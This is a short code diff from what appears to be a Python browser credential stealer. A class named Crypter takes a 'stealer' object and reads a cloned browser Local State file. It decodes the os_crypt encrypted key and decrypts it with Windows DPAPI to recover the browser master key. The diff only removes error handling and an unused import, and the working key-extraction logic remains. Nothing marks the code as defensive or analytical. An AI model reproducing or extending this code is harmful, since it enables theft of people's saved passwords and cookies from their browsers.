@@ -2,7 +2,7 @@ import json, base64
 from .browsers import Browsers
 
 from Cryptodome.Cipher import AES
-import win32crypt, sys
+import win32crypt
 
 class Crypter:
     def __init__(self, stealer, browser : Browsers):
@@ -12,15 +12,12 @@ class Crypter:
         self.master_key = self.get_key()
 
     def get_key(self):
-        try:
-            with open(self.cloned_state, 'r', encoding='utf-8') as f:
-                j = json.load(f)
-            k = base64.b64decode(j.get('os_crypt').get('encrypted_key'))
-            k = k[5:]
-            k = self.win_decrypt(k)
-            return k
-        except Exception as e:
-            print(e)
+        with open(self.cloned_state, 'r', encoding='utf-8') as f:
+            j = json.load(f)
+        k = base64.b64decode(j.get('os_crypt').get('encrypted_key'))
+        k = k[5:]
+        k = self.win_decrypt(k)
+        return k
 
     def win_decrypt(self, buffer):
         try:
